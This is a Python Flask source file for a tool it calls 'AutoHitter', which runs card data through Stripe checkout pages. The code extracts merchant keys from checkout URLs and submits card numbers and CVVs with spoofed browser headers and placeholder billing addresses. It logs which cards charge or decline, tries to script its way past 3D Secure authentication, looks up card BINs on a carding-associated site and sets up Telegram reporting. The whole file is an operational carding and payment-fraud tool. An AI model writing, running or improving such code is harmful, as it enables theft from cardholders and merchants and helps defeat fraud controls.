from flask import Flask, render_template_string, request, jsonify
import requests
import threading
import re
import os
import asyncio
import aiohttp
import base64
import time
import random
import logging
import traceback
import json
from logging.handlers import RotatingFileHandler
from datetime import datetime
from urllib.parse import unquote, urlparse, parse_qs, urlencode
from functools import wraps
from typing import Dict, Optional, Tuple, List

# Setup logging
LOG_DIR = 'logs'
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

logger = logging.getLogger('autohitter')
logger.setLevel(logging.DEBUG)

file_handler = RotatingFileHandler(
    f'{LOG_DIR}/autohitter.log',
    maxBytes=10*1024*1024,
    backupCount=5
)
file_handler.setLevel(logging.DEBUG)

console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)

formatter = logging.Formatter(
    '%(asctime)s | %(levelname)-8s | %(name)s | %(funcName)s:%(lineno)d | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
file_handler.setFormatter(formatter)
console_handler.setFormatter(formatter)

logger.addHandler(file_handler)
logger.addHandler(console_handler)

card_logger = logging.getLogger('cards')
card_logger.setLevel(logging.INFO)
card_handler = RotatingFileHandler(
    f'{LOG_DIR}/cards.log',
    maxBytes=10*1024*1024,
    backupCount=5
)
card_handler.setFormatter(logging.Formatter('%(asctime)s | %(message)s', datefmt='%Y-%m-%d %H:%M:%S'))
card_logger.addHandler(card_handler)
card_logger.propagate = False

error_logger = logging.getLogger('errors')
error_logger.setLevel(logging.ERROR)
error_handler = RotatingFileHandler(
    f'{LOG_DIR}/errors.log',
    maxBytes=10*1024*1024,
    backupCount=5
)
error_handler.setFormatter(formatter)
error_logger.addHandler(error_handler)
error_logger.propagate = False

app = Flask(__name__)

logger.info("=" * 60)
logger.info("AutoHitter v3.1 with Fixed 3DS Bypass")
logger.info("=" * 60)

AUTOHITTER_HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site"
}

def log_error(func_name, error, details=None):
    """Log errors with full context"""
    error_msg = f"ERROR in {func_name}: {str(error)}"
    if details:
        error_msg += f" | Details: {details}"
    error_logger.error(error_msg)
    error_logger.error(traceback.format_exc())

def retry_on_failure(max_retries=3, delay=1, backoff=2):
    """Decorator for retry logic with exponential backoff"""
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            retries = 0
            while retries < max_retries:
                try:
                    return await func(*args, **kwargs)
                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                    retries += 1
                    wait_time = delay * (backoff ** (retries - 1))
                    logger.warning(f"Retry {retries}/{max_retries} for {func.__name__} after {wait_time}s: {str(e)}")
                    if retries == max_retries:
                        logger.error(f"Max retries reached for {func.__name__}")
                        raise
                    await asyncio.sleep(wait_time + random.uniform(0, 0.5))
            return None
        return wrapper
    return decorator

def extract_checkout_url(text):
    patterns = [
        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s\"\'\<\>\)]+',
        r'https?://checkout\.stripe\.com/[^\s\"\'\<\>\)]+',
        r'https?://buy\.stripe\.com/[^\s\"\'\<\>\)]+',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            url = m.group(0).rstrip('.,;:')
            logger.debug(f"Extracted checkout URL: {url[:50]}...")
            return url
    logger.warning(f"No checkout URL found in text: {text[:100]}...")
    return None

def decode_pk_from_url(url):
    result = {"pk": None, "cs": None}
    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
            logger.debug(f"Found CS: {result['cs'][:20]}...")
        else:
            logger.warning("No CS token found in URL")
        
        if '#' in url:
            hash_part = url.split('#')[1]
            hash_decoded = unquote(hash_part)
            try:
                decoded_bytes = base64.b64decode(hash_decoded)
                xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
                pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
                if pk_match:
                    result["pk"] = pk_match.group(0)
                    logger.debug(f"Found PK: {result['pk'][:20]}...")
            except Exception as e:
                logger.warning(f"Failed to decode PK from URL hash: {str(e)}")
    except Exception as e:
        log_error("decode_pk_from_url", e, f"URL: {url[:50]}...")
    return result

def parse_card_autohitter(text):
    text = text.strip()
    parts = re.split(r'[|:/\\\-\s]+', text)
    if len(parts) < 4:
        logger.warning(f"Card parse failed - not enough parts: {text[:20]}...")
        return None
    
    cc = re.sub(r'\D', '', parts[0])
    if not (15 <= len(cc) <= 19):
        logger.warning(f"Invalid CC length: {len(cc)} digits")
        return None
    
    month = parts[1].strip()
    if len(month) == 1:
        month = f"0{month}"
    if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
        logger.warning(f"Invalid month: {month}")
        return None
    
    year = parts[2].strip()
    if len(year) == 4:
        year = year[2:]
    if len(year) != 2:
        logger.warning(f"Invalid year: {year}")
        return None
    
    cvv = re.sub(r'\D', '', parts[3])
    if not (3 <= len(cvv) <= 4):
        logger.warning(f"Invalid CVV length: {len(cvv)}")
        return None
    
    card = {"cc": cc, "month": month, "year": year, "cvv": cvv}
    logger.debug(f"Parsed card: {cc[:6]}******{cc[-4:]}")
    return card


class Browser3DSEmulator:
    """
    Handles 3DS2 completion for Stripe Checkout.
    Fixed version with proper challenge-response cycle handling.
    """

    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.logger = logging.getLogger('autohitter')

        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]

    async def __aenter__(self):
        timeout = aiohttp.ClientTimeout(total=90)
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=aiohttp.TCPConnector(ssl=False),
            cookie_jar=aiohttp.CookieJar()
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    def _get_api_headers(self, pk: str) -> Dict[str, str]:
        return {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": random.choice(self.user_agents),
            "authorization": f"Bearer {pk}" if pk else ""
        }

    def _parse_redirect_url(self, redirect_url: str) -> Dict:
        """Extract 3DS data from the Stripe redirect URL."""
        data = {}
        try:
            parsed = urlparse(redirect_url)

            if parsed.fragment:
                fragment = parsed.fragment
                self.logger.debug(f"Found URL fragment: {fragment[:50]}...")
                try:
                    decoded = unquote(fragment)
                    try:
                        b64_decoded = base64.b64decode(decoded + '==').decode('utf-8', errors='ignore')
                        self.logger.debug(f"Decoded fragment: {b64_decoded[:100]}...")
                        for key in ['threeDSServerTransID', 'acsUrl', 'creq', 'TermUrl', 'payment_intent']:
                            pattern = rf'"{key}"\s*:\s*"([^"]+)"'
                            match = re.search(pattern, b64_decoded)
                            if match:
                                data[key] = match.group(1)
                    except:
                        pass
                    if '=' in decoded:
                        for pair in decoded.split('&'):
                            if '=' in pair:
                                k, v = pair.split('=', 1)
                                data[k] = unquote(v)
                except Exception as e:
                    self.logger.debug(f"Fragment decode error: {e}")

            query = parse_qs(parsed.query)
            for key, values in query.items():
                if values:
                    data[key] = values[0]

            pi_match = re.search(r'pi_[A-Za-z0-9]+', redirect_url)
            if pi_match and 'payment_intent' not in data:
                data['payment_intent'] = pi_match.group(0)

            cs_match = re.search(r'pi_[A-Za-z0-9]+_secret_[A-Za-z0-9]+', redirect_url)
            if cs_match:
                data['client_secret'] = cs_match.group(0)

        except Exception as e:
            self.logger.error(f"Error parsing redirect URL: {e}")

        return data

    async def _fetch_3ds_page(self, redirect_url: str) -> Tuple[str, Dict]:
        """Fetch the 3DS page and extract any embedded data."""
        try:
            headers = {
                "User-Agent": random.choice(self.user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            }

            async with self.session.get(
                redirect_url,
                headers=headers,
                allow_redirects=True
            ) as resp:
                html = await resp.text()
                final_url = str(resp.url)

                self.logger.debug(f"3DS page fetched: {resp.status}, {len(html)} bytes")

                page_data = {}

                script_patterns = [
                    r'window\.__STRIPE_3DS_DATA__\s*=\s*(\{[^;]+\})',
                    r'var\s+threeDSData\s*=\s*(\{[^;]+\})',
                    r'"threeDSServerTransID"\s*:\s*"([^"]+)"',
                    r'"acsUrl"\s*:\s*"([^"]+)"',
                    r'"creq"\s*:\s*"([^"]+)"',
                    r'creq["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'acsUrl["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                ]

                for pattern in script_patterns:
                    match = re.search(pattern, html)
                    if match:
                        if '{' in match.group(0):
                            try:
                                json_str = match.group(1)
                                json_data = json.loads(json_str)
                                page_data.update(json_data)
                            except:
                                pass
                        else:
                            key = 'creq' if 'creq' in pattern else 'acsUrl' if 'acsUrl' in pattern else 'threeDSServerTransID'
                            page_data[key] = match.group(1)

                form_match = re.search(r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>(.*?)</form>', html, re.DOTALL)
                if form_match:
                    page_data['acsUrl'] = form_match.group(1)
                    form_html = form_match.group(2)
                    for name, value in re.findall(r'name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', form_html):
                        page_data[name] = value

                return html, {"final_url": final_url, "status": resp.status, "page_data": page_data}

        except Exception as e:
            self.logger.error(f"Failed to fetch 3DS page: {e}")
            return "", {"error": str(e)}

    async def _complete_3ds_via_api(self, pi_id: str, pi_client_secret: str, pk: str) -> Dict:
        """Complete 3DS using Stripe's native API."""
        result = {"success": False, "error": None, "details": {}}

        try:
            headers = self._get_api_headers(pk)

            self.logger.debug(f"Checking PI status: {pi_id[:20]}...")

            async with self.session.get(
                f"https://api.stripe.com/v1/payment_intents/{pi_id}",
                headers=headers,
                params={"client_secret": pi_client_secret}
            ) as resp:
                pi_data = await resp.json()
                status = pi_data.get("status", "")
                next_action = pi_data.get("next_action", {})

                self.logger.debug(f"PI status: {status}, next_action: {next_action.get('type', 'none')}")

                result["details"]["initial_status"] = status
                result["details"]["next_action_type"] = next_action.get("type", "")

                if status == "succeeded":
                    result["success"] = True
                    result["details"]["message"] = "Payment already succeeded"
                    return result

                if status != "requires_action":
                    result["error"] = f"Unexpected PI status: {status}"
                    return result

                self.logger.info("Attempting PI confirmation with 3DS completion...")

                confirm_body = f"client_secret={pi_client_secret}&key={pk}"

                async with self.session.post(
                    f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                    headers=headers,
                    data=confirm_body
                ) as resp:
                    confirm_data = await resp.json()
                    new_status = confirm_data.get("status", "")

                    self.logger.debug(f"Confirm response status: {new_status}")
                    result["details"]["confirm_status"] = new_status

                    if new_status == "succeeded":
                        result["success"] = True
                        result["details"]["message"] = "3DS completed via direct confirmation"
                        return result

                    if new_status == "requires_action":
                        self.logger.info("PI still requires action, need full 3DS flow")

                        new_next_action = confirm_data.get("next_action", {})
                        redirect_info = new_next_action.get("redirect_to_url", {})
                        redirect_url = redirect_info.get("url", "")

                        if redirect_url:
                            result["details"]["redirect_url"] = redirect_url
                            self.logger.info(f"Got 3DS redirect URL: {redirect_url[:60]}...")
                            return await self._do_3ds_challenge(redirect_url, pi_id, pi_client_secret, pk)
                        else:
                            result["error"] = "No redirect URL in confirm response"
                            return result
                    else:
                        error = confirm_data.get("error", {})
                        result["error"] = error.get("message", f"Unexpected status: {new_status}")
                        return result

        except Exception as e:
            self.logger.error(f"API 3DS completion error: {e}")
            result["error"] = str(e)

        return result

    async def _do_3ds_challenge(self, redirect_url: str, pi_id: str, pi_client_secret: str, pk: str) -> Dict:
        """Perform the actual 3DS challenge flow with proper CRes handling."""
        result = {"success": False, "error": None, "details": {}}

        try:
            html, page_info = await self._fetch_3ds_page(redirect_url)

            if not html:
                result["error"] = "Failed to fetch 3DS page"
                return result

            page_data = page_info.get("page_data", {})
            self.logger.debug(f"Page data extracted: {list(page_data.keys())}")

            url_data = self._parse_redirect_url(redirect_url)
            self.logger.debug(f"URL data extracted: {list(url_data.keys())}")

            all_data = {**url_data, **page_data}

            if not all_data.get("creq") and not all_data.get("acsUrl"):
                self.logger.info("No challenge data found - may be frictionless")

                confirm_result = await self._confirm_pi(pi_id, pi_client_secret, pk)
                if confirm_result["success"]:
                    result["success"] = True
                    result["details"]["flow"] = "frictionless"
                    return result
                else:
                    result["error"] = f"Frictionless confirm failed: {confirm_result.get('error')}"
                    return result

            acs_url = all_data.get("acsUrl", "")
            creq = all_data.get("creq", "")
            term_url = all_data.get("TermUrl", "")

            if not acs_url or not creq:
                result["error"] = f"Missing ACS data: acsUrl={bool(acs_url)}, creq={bool(creq)}"
                result["details"]["all_data_keys"] = list(all_data.keys())
                return result

            self.logger.info(f"Submitting 3DS challenge to ACS: {acs_url[:50]}...")

            form_data = {"creq": creq}
            if term_url:
                form_data["TermUrl"] = term_url

            headers = {
                "User-Agent": random.choice(self.user_agents),
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": urlparse(acs_url).scheme + "://" + urlparse(acs_url).netloc,
                "Referer": acs_url,
            }

            async with self.session.post(
                acs_url,
                headers=headers,
                data=form_data,
                allow_redirects=True
            ) as resp:
                acs_response = await resp.text()
                acs_status = resp.status

                self.logger.debug(f"ACS response: {acs_status}, {len(acs_response)} bytes")
                result["details"]["acs_status"] = acs_status

                cres_match = re.search(r'"cres"\s*:\s*"([^"]+)"', acs_response)
                if not cres_match:
                    cres_match = re.search(r'cres=([^&\s]+)', acs_response)

                trans_status = None
                ts_match = re.search(r'"transStatus"\s*:\s*"([^"]+)"', acs_response)
                if ts_match:
                    trans_status = ts_match.group(1)
                    result["details"]["transStatus"] = trans_status

                if trans_status in ["Y", "A"]:
                    self.logger.info(f"3DS authenticated: transStatus={trans_status}")

                    if cres_match and term_url:
                        cres = cres_match.group(1)
                        self.logger.debug("Posting CRes to TermUrl...")

                        async with self.session.post(
                            term_url,
                            headers=headers,
                            data={"cres": cres},
                            allow_redirects=True
                        ) as term_resp:
                            self.logger.debug(f"TermUrl response: {term_resp.status}")
                            result["details"]["term_url_status"] = term_resp.status

                    self.logger.info("Performing final PI confirmation...")
                    confirm_result = await self._confirm_pi(pi_id, pi_client_secret, pk)

                    if confirm_result["success"]:
                        result["success"] = True
                        result["details"]["flow"] = "challenge_completed"
                        result["details"]["pi_status"] = confirm_result.get("status")
                    else:
                        result["error"] = f"Final PI confirm failed: {confirm_result.get('error')}"

                elif trans_status == "C":
                    result["error"] = "Additional challenge required (transStatus=C)"
                    result["details"]["acs_response"] = acs_response[:500]
                else:
                    result["error"] = f"3DS not authenticated: transStatus={trans_status}"
                    result["details"]["acs_response"] = acs_response[:500]

        except Exception as e:
            self.logger.error(f"3DS challenge error: {e}")
            result["error"] = str(e)

        return result

    async def _confirm_pi(self, pi_id: str, pi_client_secret: str, pk: str) -> Dict:
        """Confirm PaymentIntent and check final status."""
        result = {"success": False, "error": None, "status": None}

        try:
            headers = self._get_api_headers(pk)

            async with self.session.post(
                f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                headers=headers,
                data=f"client_secret={pi_client_secret}&key={pk}"
            ) as resp:
                data = await resp.json()
                status = data.get("status", "")
                result["status"] = status

                self.logger.debug(f"PI confirm status: {status}")

                if status == "succeeded":
                    result["success"] = True
                elif status == "requires_action":
                    next_action = data.get("next_action", {})
                    redirect_info = next_action.get("redirect_to_url", {})
                    if redirect_info.get("url"):
                        result["redirect_url"] = redirect_info["url"]
                        result["error"] = "Still requires 3DS action"
                    else:
                        result["error"] = "requires_action but no redirect URL"
                else:
                    error = data.get("error", {})
                    result["error"] = error.get("message", f"Status: {status}")

        except Exception as e:
            self.logger.error(f"PI confirm error: {e}")
            result["error"] = str(e)

        return result

    async def bypass_3ds(
        self,
        redirect_url: str,
        pi_id: str,
        pk: str,
        pi_client_secret: Optional[str] = None,
        expected_return_url: Optional[str] = None
    ) -> Dict:
        """Main entry point for 3DS bypass."""
        result = {
            "success": False,
            "authenticated": False,
            "method": "api_direct",
            "error": None,
            "details": {}
        }

        try:
            self.logger.info(f"Starting 3DS bypass for PI: {pi_id[:20]}...")

            if not pi_client_secret:
                url_data = self._parse_redirect_url(redirect_url)
                pi_client_secret = url_data.get("client_secret", "")

                if not pi_client_secret:
                    result["error"] = "No PI client secret available"
                    return result

            self.logger.info("Attempting direct API 3DS completion...")
            api_result = await self._complete_3ds_via_api(pi_id, pi_client_secret, pk)

            if api_result["success"]:
                result["success"] = True
                result["authenticated"] = True
                result["details"] = api_result["details"]
                self.logger.info(f"3DS bypass SUCCESSFUL via API for {pi_id[:20]}...")
                return result

            self.logger.warning(f"API method failed: {api_result.get('error')}, trying browser method...")
            result["details"]["api_attempt"] = api_result

            if api_result.get("details", {}).get("redirect_url"):
                redirect_url = api_result["details"]["redirect_url"]

            browser_result = await self._do_3ds_challenge(
                redirect_url, pi_id, pi_client_secret, pk
            )

            if browser_result["success"]:
                result["success"] = True
                result["authenticated"] = True
                result["method"] = "browser_challenge"
                result["details"]["browser"] = browser_result["details"]
                self.logger.info(f"3DS bypass SUCCESSFUL via browser for {pi_id[:20]}...")
            else:
                result["error"] = browser_result.get("error", "Browser method failed")
                result["details"]["browser"] = browser_result.get("details", {})

        except Exception as e:
            self.logger.error(f"3DS bypass error: {e}")
            result["error"] = str(e)

        return result


@retry_on_failure(max_retries=3, delay=1)
async def get_checkout_info_async(url):
    result = {"pk": None, "cs": None, "merchant": None, "price": None, "currency": None, "init_data": None, "error": None}
    try:
        decoded = decode_pk_from_url(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")
        
        if not result["pk"] or not result["cs"]:
            result["error"] = "Could not decode PK/CS from URL"
            logger.error(f"Checkout init failed: {result['error']}")
            return result
        
        logger.info(f"Initializing checkout for CS: {result['cs'][:20]}...")
        
        async with aiohttp.ClientSession() as session:
            body = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"
            
            async with session.post(
                f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
                headers=AUTOHITTER_HEADERS,
                data=body,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as r:
                init_data = await r.json()
                
            if "error" not in init_data:
                result["init_data"] = init_data
                acc = init_data.get("account_settings", {})
                result["merchant"] = acc.get("display_name") or acc.get("business_name")
                result["email"] = init_data.get("customer_email") or init_data.get("customer", {}).get("email") or "N/A"
                
                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    result["price"] = lig.get("total", 0) / 100
                    result["currency"] = lig.get("currency", "").upper()
                elif inv:
                    result["price"] = inv.get("total", 0) / 100
                    result["currency"] = inv.get("currency", "").upper()
                
                logger.info(f"Checkout loaded: {result['merchant']} | {result['currency']} {result['price']}")
            else:
                result["error"] = init_data.get("error", {}).get("message", "Init failed")
                logger.error(f"Stripe init error: {result['error']}")
                
    except asyncio.TimeoutError:
        result["error"] = "Request timeout"
        logger.error(f"Timeout getting checkout info for {url[:50]}...")
    except aiohttp.ClientError as e:
        result["error"] = f"Network error: {str(e)}"
        logger.error(f"Network error: {str(e)}")
    except Exception as e:
        result["error"] = str(e)
        log_error("get_checkout_info_async", e)
    
    return result

@retry_on_failure(max_retries=2, delay=0.5)
async def charge_card_async(card, checkout_data, proxy=None):
    start = time.perf_counter()
    card_masked = f"{card['cc'][:6]}******{card['cc'][-4:]}"
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "time": 0,
        "redirect_url": None,
        "pi_id": None,
        "pi_client_secret": None
    }
    
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    
    if not pk or not cs or not init_data:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        logger.warning(f"Charge failed for {card_masked}: No checkout data")
        return result
    
    try:
        connector = None
        if proxy:
            connector = aiohttp.TCPConnector()
            logger.debug(f"Using proxy for {card_masked}")
        
        async with aiohttp.ClientSession(connector=connector) as s:
            email = init_data.get("customer_email") or "john@example.com"
            checksum = init_data.get("init_checksum", "")
            
            lig = init_data.get("line_item_group")
            inv = init_data.get("invoice")
            if lig:
                total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
            elif inv:
                total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
            else:
                pi = init_data.get("payment_intent") or {}
                total = subtotal = pi.get("amount", 0)
            
            cust = init_data.get("customer") or {}
            addr = cust.get("address") or {}
            name = cust.get("name") or "John Smith"
            country = addr.get("country") or "US"
            line1 = addr.get("line1") or "476 West White Mountain Blvd"
            city = addr.get("city") or "Pinetop"
            state = addr.get("state") or "AZ"
            zip_code = addr.get("postal_code") or "85929"
            
            # Step 1: Create token
            logger.debug(f"Creating token for {card_masked}")
            token_body = f"card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]={card['year']}&card[name]={name}&card[address_country]={country}&card[address_line1]={line1}&card[address_city]={city}&card[address_state]={state}&card[address_zip]={zip_code}&key={pk}&pasted_fields=number&payment_user_agent=stripe.js%2Fb3f6c00c8a%3B+stripe-js-v3%2Fb3f6c00c8a%3B+checkout&referrer=https%3A%2F%2Fcheckout.stripe.com&time_on_page={random.randint(15000, 45000)}"
            
            token_headers = {
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            
            async with s.post(
                "https://api.stripe.com/v1/tokens",
                headers=token_headers,
                data=token_body,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as r:
                tok = await r.json()
            
            if "error" in tok:
                result["status"] = "DECLINED"
                result["response"] = tok["error"].get("message", "Card error")
                result["time"] = round(time.perf_counter() - start, 2)
                card_logger.info(f"DECLINED | {card_masked} | {result['response']} | {result['time']}s")
                return result
            
            token_id = tok.get("id")
            if not token_id:
                result["status"] = "FAILED"
                result["response"] = "No Token"
                result["time"] = round(time.perf_counter() - start, 2)
                logger.error(f"Token creation failed for {card_masked}: No token ID in response")
                return result
            
            logger.debug(f"Token created for {card_masked}: {token_id[:20]}...")
            
            # Step 2: Create payment method
            pm_body = f"type=card&card[token]={token_id}&billing_details[name]={name}&billing_details[email]={email}&billing_details[address][country]={country}&billing_details[address][line1]={line1}&billing_details[address][city]={city}&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&key={pk}"
            
            async with s.post(
                "https://api.stripe.com/v1/payment_methods",
                headers=AUTOHITTER_HEADERS,
                data=pm_body,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as r:
                pm = await r.json()
            
            if "error" in pm:
                result["status"] = "DECLINED"
                result["response"] = pm["error"].get("message", "Card error")
                result["time"] = round(time.perf_counter() - start, 2)
                card_logger.info(f"DECLINED | {card_masked} | {result['response']} | {result['time']}s")
                return result
            
            pm_id = pm.get("id")
            if not pm_id:
                result["status"] = "FAILED"
                result["response"] = "No PM"
                result["time"] = round(time.perf_counter() - start, 2)
                logger.error(f"Payment method creation failed for {card_masked}: No PM ID")
                return result
            
            logger.debug(f"Payment method created for {card_masked}: {pm_id[:20]}...")
            
            # Step 3: Confirm payment
            conf_body = f"eid=NA&payment_method={pm_id}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
            
            async with s.post(
                f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
                headers=AUTOHITTER_HEADERS,
                data=conf_body,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as r:
                conf = await r.json()
            
            if "error" in conf:
                err = conf["error"]
                dc = err.get("decline_code", "")
                msg = err.get("message", "Failed")
                result["status"] = "DECLINED"
                result["response"] = f"{dc.upper()}: {msg}" if dc else msg
                result["time"] = round(time.perf_counter() - start, 2)
                card_logger.info(f"DECLINED | {card_masked} | {result['response']} | {result['time']}s")
            else:
                pi = conf.get("payment_intent") or {}
                st = pi.get("status", "") or conf.get("status", "")
                pi_id = pi.get("id", "")
                pi_cs = pi.get("client_secret", "")
                
                # Store PI data for 3DS bypass
                result["pi_id"] = pi_id
                result["pi_client_secret"] = pi_cs
                
                if st == "succeeded":
                    result["status"] = "CHARGED"
                    result["response"] = "Payment Successful"
                    result["time"] = round(time.perf_counter() - start, 2)
                    card_logger.info(f"CHARGED | {card_masked} | {result['response']} | {result['time']}s")
                    logger.info(f"SUCCESS! Card {card_masked} charged successfully")
                    
                elif st == "requires_action":
                    # Extract 3DS redirect URL
                    next_action = pi.get("next_action") or conf.get("next_action") or {}
                    redirect_info = next_action.get("redirect_to_url") or {}
                    redirect_url = redirect_info.get("url", "")
                    
                    result["redirect_url"] = redirect_url
                    result["status"] = "3DS"
                    result["response"] = "3DS Required - Browser Bypass Available"
                    result["time"] = round(time.perf_counter() - start, 2)
                    
                    logger.info(f"3DS required for {card_masked}, redirect URL captured")
                    card_logger.info(f"3DS | {card_masked} | Redirect URL captured | {result['time']}s")
                    
                elif st == "requires_payment_method":
                    result["status"] = "DECLINED"
                    result["response"] = "Card Declined"
                    result["time"] = round(time.perf_counter() - start, 2)
                    card_logger.info(f"DECLINED | {card_masked} | {result['response']} | {result['time']}s")
                else:
                    result["status"] = "UNKNOWN"
                    result["response"] = st or "Unknown"
                    result["time"] = round(time.perf_counter() - start, 2)
                    logger.warning(f"Unknown status for {card_masked}: {st}")
                    card_logger.info(f"UNKNOWN | {card_masked} | {result['response']} | {result['time']}s")
                    
    except asyncio.TimeoutError:
        result["status"] = "ERROR"
        result["response"] = "Request timeout"
        result["time"] = round(time.perf_counter() - start, 2)
        logger.error(f"Timeout charging card {card_masked}")
        card_logger.error(f"ERROR | {card_masked} | Timeout | {result['time']}s")
        
    except aiohttp.ClientError as e:
        result["status"] = "ERROR"
        result["response"] = f"Network error: {str(e)[:50]}"
        result["time"] = round(time.perf_counter() - start, 2)
        logger.error(f"Network error charging {card_masked}: {str(e)}")
        card_logger.error(f"ERROR | {card_masked} | Network error | {result['time']}s")
        
    except Exception as e:
        result["status"] = "ERROR"
        result["response"] = str(e)[:50]
        result["time"] = round(time.perf_counter() - start, 2)
        log_error("charge_card_async", e, f"Card: {card_masked}")
        card_logger.error(f"ERROR | {card_masked} | {result['response']} | {result['time']}s")
    
    return result

async def attempt_3ds_bypass(result: Dict, checkout_data: Dict, card: Dict) -> Dict:
    """Attempt browser-based 3DS bypass when 3DS is required"""
    if result["status"] != "3DS" or not result.get("redirect_url"):
        return result
    
    card_masked = f"{card['cc'][:6]}******{card['cc'][-4:]}"
    logger.info(f"Attempting browser 3DS bypass for {card_masked}...")
    
    try:
        async with Browser3DSEmulator() as emulator:
            bypass_result = await emulator.bypass_3ds(
                redirect_url=result["redirect_url"],
                pi_id=result.get("pi_id", ""),
                pk=checkout_data.get("pk", ""),
                expected_return_url=f"https://checkout.stripe.com/pay/{result.get('pi_id', '')}"
            )
        
        if bypass_result["success"] and bypass_result["authenticated"]:
            result["status"] = "CHARGED"
            result["response"] = "3DS Browser Bypass Successful"
            logger.info(f"3DS bypass successful for {card_masked}!")
            card_logger.info(f"CHARGED | {card_masked} | 3DS Browser Bypass | {result['time']}s")
        else:
            result["response"] = f"3DS bypass failed: {bypass_result.get('error', 'Unknown error')}"
            logger.warning(f"3DS bypass failed for {card_masked}: {bypass_result.get('error')}")
            
    except Exception as e:
        logger.error(f"3DS bypass error for {card_masked}: {str(e)}")
        result["response"] = f"3DS bypass error: {str(e)[:50]}"
    
    return result


TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = "@Linord"

def get_bin_info(cc):
    try:
        bin_number = cc.split('|')[0][:6]
        logger.debug(f"Looking up BIN: {bin_number}")
        
        resp = requests.get(
            f"https://bins.antipublic.cc/bins/{bin_number}",
            timeout=10
        )
        
        if resp.status_code == 200:
            data = resp.json()
            bin_info = {
                'bin': bin_number,
                'brand': data.get('brand', 'N/A'),
                'type': data.get('type', 'N/A'),
                'level': data.get('level', 'N/A'),
                'bank': data.get('bank', 'N/A'),
                'country': data.get('country_name', 'N/A'),
                'country_flag': data.get('country_flag', '')
            }
            logger.debug(f"BIN lookup success: {bin_info['brand']} - {bin_info['bank']}")
            return bin_info
        else:
            logger.warning(f"BIN lookup failed with status {resp.status_code}")
            
    except requests.Timeout:
        logger.warning(f"BIN lookup timeout for {cc[:6]}")
    except Exception as e:
        log_error("get_bin_info", e, f"BIN: {cc[:6]}")
    
    return None

